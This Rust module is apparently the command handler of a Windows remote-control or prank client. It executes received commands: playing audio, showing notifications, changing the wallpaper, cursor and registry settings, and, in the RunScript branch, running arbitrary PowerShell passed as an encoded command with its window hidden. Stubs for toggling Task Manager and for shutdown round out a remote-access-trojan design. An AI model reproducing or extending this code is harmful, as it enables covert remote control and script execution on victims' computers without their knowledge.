pub mod command {
    use std::io::{Cursor, Write};
    use std::ops::Deref;
    use windows_sys::Win32::UI::WindowsAndMessaging::{SetSystemCursor, LoadCursorFromFileW, OCR_NORMAL, IDC_ARROW, SystemParametersInfoW, SPI_SETCURSORS, SPIF_SENDCHANGE, SPIF_UPDATEINIFILE};
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::os::windows::process::CommandExt;
    use std::ptr::null_mut;
    use base64::Engine;
    use base64::prelude::BASE64_STANDARD;
    use serde::{Deserialize};
    use notify_rust::Notification;
    use rodio::{Decoder, Sink};
    use tempfile::{Builder};
    use winreg::enums::HKEY_CURRENT_USER;
    use winreg::RegKey;
    use tokio::task::spawn_blocking;

    pub enum RPTResponse {
        IncompatibleServerVersion,
        Success,
    }
    #[derive(Debug, Clone, Deserialize)]
    pub enum RPTCommandType {
        PlayAudio,
        RunScript,
        KillScript,
        ChangeEnabledTskManager,
        ChangeWallpaper,
        ChangeCursor,
        Shutdown,
        WinMessage
    }

    #[derive(Clone, Deserialize, Debug)]
    pub struct RPTCommand {
        pub rpt_type: RPTCommandType,
        pub data: Vec<u8>,
        pub flags: Vec<String>,
    }

    impl RPTCommand {
        pub async fn execute(&self) -> Result<RPTResponse, ()> {
            const CREATE_NO_WINDOW: u32 = 0x08000000;

            match self.rpt_type {
                RPTCommandType::PlayAudio => {
                    let audio_data = self.data.clone();
                    spawn_blocking(move || {
                        let stream_handle = rodio::OutputStreamBuilder::open_default_stream().expect("open default audio stream");
                        let sink = Sink::connect_new(&stream_handle.mixer());

                        let cursor: Cursor<Vec<u8>> = Cursor::new(audio_data);
                        let source = Decoder::try_from(cursor).expect("decoder error!");
                        sink.append(source);
                        sink.sleep_until_end();
                    });

                    Ok(RPTResponse::Success)
                }
                RPTCommandType::RunScript => {
                    let data = &self.data;
                    let new_data = String::from_utf8(data.deref().to_owned()).unwrap();
                    let utf16_script: Vec<u16> = new_data.encode_utf16().collect();
                    let mut bytes = Vec::new();
                    for &u in &utf16_script {
                        bytes.extend_from_slice(&u.to_le_bytes());
                    }
                    let encoded = BASE64_STANDARD.encode(bytes);

                    std::process::Command::new("powershell")
                        .args(["-EncodedCommand", &encoded])
                        .creation_flags(CREATE_NO_WINDOW)
                        .spawn()
                        .expect("");

                    Ok(RPTResponse::Success)
                }
                RPTCommandType::KillScript => {
                    Ok(RPTResponse::Success)
                }
                RPTCommandType::WinMessage => {
                    let data = &self.data;
                    let new_data = String::from_utf8(data.deref().to_owned()).unwrap();
                    let parts = new_data.split("<split>").collect::<Vec<&str>>();
                    let (title, text) = (parts[0], parts[1]);

                    Notification::new()
                        .summary(title)
                        .body(text)
                        .show().expect("Failed to show notification");
                    Ok(RPTResponse::Success)
                }
                RPTCommandType::ChangeCursor => {
                    if self.flags.contains(&"RESET".to_string()) {
                        unsafe {
                            SystemParametersInfoW(
                                SPI_SETCURSORS,
                                0,
                                null_mut(),
                                SPIF_SENDCHANGE | SPIF_UPDATEINIFILE
                            );
                        }
                    }
                    // MIN 1 MAX 15
                    else if self.flags.contains(&"SET_SIZE".to_string()) {
                        let data = &self.data;
                        let cursor_size = u32::from_be_bytes(data.deref().try_into().unwrap());
                        let hkcu = RegKey::predef(HKEY_CURRENT_USER);

                        let (key_acc, _d2) = hkcu.create_subkey(r"Software\Microsoft\Accessibility").expect("Failed Acc");
                        key_acc.set_value("CursorSize", &cursor_size).expect("Failed Acc val");

                        unsafe {
                            SystemParametersInfoW(0x002F, 0, null_mut(), 0x01 | 0x02);
                        }
                    }
                    else {
                        let data = &self.data;
                        let final_path = {
                            let mut temp_file = Builder::new()
                                .prefix("cursor")
                                .suffix(".cur")
                                .tempfile()
                                .expect("Failed to create temp file");

                            temp_file.write_all(data).expect("Failed to write temp file");
                            let (_file, path) = temp_file.keep().expect("failed to keep temp file");
                            dunce::canonicalize(path).expect("Failed to canonicalize path")
                        };
                        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
                        let path_wide: Vec<u16> = OsStr::new(&final_path)
                            .encode_wide()
                            .chain(std::iter::once(0))
                            .collect();
                        unsafe {
                            let h_cursor = LoadCursorFromFileW(path_wide.as_ptr());

                            SetSystemCursor(h_cursor, OCR_NORMAL);
                        }
                    }

                    Ok(RPTResponse::Success)
                }
                RPTCommandType::ChangeEnabledTskManager => {
                    Ok(RPTResponse::Success)
                }
                RPTCommandType::Shutdown => {
                    Ok(RPTResponse::Success)
                }
                RPTCommandType::ChangeWallpaper => {
                    let data = &self.data;
                    let final_path = {
                        let mut temp_file = Builder::new()
                            .prefix("wallpaper")
                            .suffix(".jpg")
                            .tempfile()
                            .expect("Failed to create temp file");

                        temp_file.write_all(data).expect("Failed to write temp file");
                        let (_file, path) = temp_file.keep().expect("failed to keep temp file");
                        dunce::canonicalize(path).expect("Failed to canonicalize path")
                    };
                    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
                    wallpaper::set_from_path(final_path.to_str().unwrap()).expect("Failed to set wallpaper");

                    Ok(RPTResponse::Success)
                }
                _ => {
                    println!("failed");
                    Ok(RPTResponse::Success)
                }
            }
        }
    }
}